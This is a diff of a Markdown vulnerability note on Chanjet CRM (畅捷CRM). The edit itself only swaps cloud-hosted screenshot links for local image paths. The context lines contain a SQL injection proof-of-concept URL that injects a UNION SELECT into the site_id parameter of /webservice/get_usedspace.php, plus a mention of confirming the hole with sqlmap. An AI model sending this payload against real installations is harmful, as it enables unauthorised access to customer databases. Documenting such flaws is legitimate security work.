@@ -20,7 +20,7 @@ title="畅捷CRM"
 
 登录页面
 
-![image-20220525145239822](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205251452933.png)
+![image-20220525145239822](./images/202205251452933.png)
 
 验证POC
 
@@ -28,7 +28,7 @@ title="畅捷CRM"
 /webservice/get_usedspace.php?site_id=-1159 UNION ALL SELECT CONCAT(0x76756c6e,0x76756c6e,0x76756c6e)--
 ```
 
-![image-20220525145324633](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205251453704.png)
+![image-20220525145324633](./images/202205251453704.png)
 
 使用Sqlmap验证漏洞
 
